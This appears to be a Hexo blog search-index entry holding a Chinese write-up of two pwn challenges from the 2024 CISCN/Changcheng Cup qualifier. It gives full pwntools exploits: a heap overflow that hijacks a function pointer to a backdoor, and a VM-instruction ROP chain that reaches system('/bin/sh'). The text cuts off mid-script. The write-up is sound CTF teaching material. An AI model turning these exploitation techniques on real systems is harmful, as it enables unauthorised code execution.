<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024ciscn&amp;长城杯初赛pwn方向部分题解</title>
    <url>/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h4 id="pwn-anote"><a href="#pwn-anote" class="headerlink" title="pwn-anote"></a>pwn-anote</h4><p>32位程序，存在后门函数。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215182951906.png"
                      class=""
                >

<p>粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215183554444.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215184559047.png"
                      class=""
                >

<p>这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入一个函数指针，结合反编译代码不难发现，这个调用的函数指针实际是用来打印<code>work done</code>的，这里我们如果能劫持这个指针到backdoor，就能getshell。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185453342.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185705572.png"
                      class=""
                >

<p>然后看看edit一些参数的限制，其中长度最多为40，但这个长度已经足以进行堆溢出，覆盖到下一个chunk的data域了，那么就可以直接把函数指针给改了。这里的函数指针是二级指针，所以还不能直接填进去backdoor函数的地址，由于gift给了堆上的地址了，那么我们就能先在堆的某个位置填入backdoor地址，然后劫持的函数指针指向该地址处。最后edit触发一下，然后就有shell了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185800640.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190233099.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201646774.png"
                      class=""
                >

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.95.214.102&quot;</span>,<span class="number">20609</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">backdoor = <span class="number">0x80489CE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():       <span class="comment">#max 9</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):     <span class="comment">#size&lt;40,触发函数指针</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;len&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">9</span>),<span class="number">16</span>)-<span class="number">0x5fc8</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">28</span>,p32(backdoor)*<span class="number">5</span>+p32(<span class="number">0x21</span>)+p32(heap_base+<span class="number">0x5fd0</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">10</span>,<span class="string">b&quot;abcd&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h4 id="pwn-avm"><a href="#pwn-avm" class="headerlink" title="pwn-avm"></a>pwn-avm</h4><p>VMpwn，首先要逆出其中每个指令的含义，以及自定义指令的构成。</p>
<p>首先主函数可以读取0x300字节的输入，然后进initial函数进行初始化。具体是往opt+0x100地址之后填一些控制信息，然后再把前面的位置都置空。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190920906.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191043445.png"
                      class=""
                >

<p>经过动态调试，最后逆出的opt结构大概是这样，0x108处存我们的输入，也就是具体的指令，0x100处存目前指令的偏移（从后面动调看出），0x110处存最大的指令偏移。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191015846.png"
                      class=""
                >

<p>然后看最重要的parse函数，首先v2里存了我们的选项，后面函数表中总共有10种不同的指令，注意到这里最后向右移位了0x1C，所以我们实际的指令种类是存在左移位0x1C处的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192127742.png"
                      class=""
                >

<p>第一个函数如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192643849.png"
                      class=""
                >

<p>第二个函数如下:</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192712698.png"
                      class=""
                >

<p>第三个函数如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192739108.png"
                      class=""
                >

<p>看了三个具体指令的实现，我们观察到只有最后赋值后面的运算符发生了变化，然后我们就可以猜测其具体就是分别实现了add，sub，mul的功能，以此类推，就能得到前八个函数的大体作用。这里其实我们能看到opt前面0x100个字节分成了32个8字节，分别模拟了32个寄存器，我们的内容都是存在模拟寄存器中，前面8个函数也都只能对模拟寄存器做操作。实际上由于前面把这0x100个字节置空，所以直接调用前面这8个指令，得到的结果永远都是0。还有一点就是发现每个指令都会把opt偏移0x100处累加四，这说明每个指令都占用四个字节长度（逻辑上如此，而实际上后面分析也的确如此）。我们最多可以连续写0x300&#x2F;0x4&#x3D;0xc0个指令。</p>
<p>第9个和第10个函数稍微有点不同：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193045374.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193103501.png"
                      class=""
                >

<p>直接看有点摸不着头脑，只知道a2是一个栈上的缓冲区，我们后面动态调试的时候就会发现，这里第9个实际上能够往该缓冲区中写一个前面模拟寄存器的值，其偏移最多为0xFFF；而第十个函数可以从缓冲区偏移最多0xFFF处，读取一个值到我们的模拟寄存器。这里的<code>(HIWORD(v3) &amp; 0xFFF)</code>实际上相当于一个立即数，代表偏移。之后我们的指令表大概就恢复完成了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192212512.png"
                      class=""
                >

<p>下一个问题是指令的具体组成，比如我们想用write_reg往偏移为25的模拟寄存器存缓冲区偏移0xd38的内容，那么我们可以在汇编的具体执行过程中进行分析。逐渐调试就能得到<code>payload = p32((10&lt;&lt;0x1c)+(tarreg&amp;0x1f)+((reg1&amp;0x1f)&lt;&lt;5)+((num&amp;0xfff)&lt;&lt;16))</code>。也就是说指令类型左移位0x1c，存储结果寄存器在最低位（且不超过31），一个被当作偏移的寄存器序号在左移位5位处，立即数在左移位16位处。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215194053168.png"
                      class=""
                >

<p>然后就能还原出每一个指令的组成结构：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>之后的问题就是要从栈上已有的固定的内容，读取到模拟寄存器中，这里我们在动态调试时，能够看到缓冲区的起始地址，也就是加上我们的立即数偏移这个位置。这里如果我们最后所有指令结束后，parse函数返回时，就会到偏移0x118位置。我们想要算出gadget和system等相关于libc的地址，所以要获取libc基址。这里能在0xd38偏移位置找到，而且这个是前面栈帧所遗留的，不会在每次程序执行时变化。同时我们还能在这个libc相关地址上面获取到一个1，将他们存到模拟寄存器中。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195205194.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195328605.png"
                      class=""
                >

<p>后面就是要先算出libc基址，然后得到ret，pop_rdi_ret，&#x2F;bin&#x2F;sh字符串以及system的地址。这里直接自己找栈上的内容，然后一点一点手动构造出来显然不是很现实。然后发现距离libc_base偏移最多的&#x2F;bin&#x2F;sh字符串地址的偏移为0x1d8678。换算成二进制，大概要用21个二进制位，不过我们模拟寄存器位充足，最后我用寄存器模拟了23个二进制位。这样我们可以用模拟寄存器的线性组合表示出任何我们想要的偏移。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215200035859.png"
                      class=""
                >

<p>具体组合实现：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)		<span class="comment">#get libc_base，saved in 25</span></span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br></pre></td></tr></table></figure></div>

<p>基本动态调试能正确算出一个偏移，那么其它的也就没问题了，这里我往25号模拟寄存器存libc_base，24号模拟寄存器存偏移。直接往返回地址处写rop链。最后也是只用了0x150字节，离0x300字节的上限还远。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201820964.png"
                      class=""
                >

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"><span class="comment"># 0x300大小限制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    len    func</span></span><br><span class="line"><span class="comment"># 1   4      add</span></span><br><span class="line"><span class="comment"># 2   4      sub</span></span><br><span class="line"><span class="comment"># 3   4      mul</span></span><br><span class="line"><span class="comment"># 4   4      div</span></span><br><span class="line"><span class="comment"># 5   4      xor</span></span><br><span class="line"><span class="comment"># 6   4      and</span></span><br><span class="line"><span class="comment"># 7   4      shl</span></span><br><span class="line"><span class="comment"># 8   4      shr</span></span><br><span class="line"><span class="comment"># 9   4     write_stack</span></span><br><span class="line"><span class="comment"># 10  4     write_reg</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span 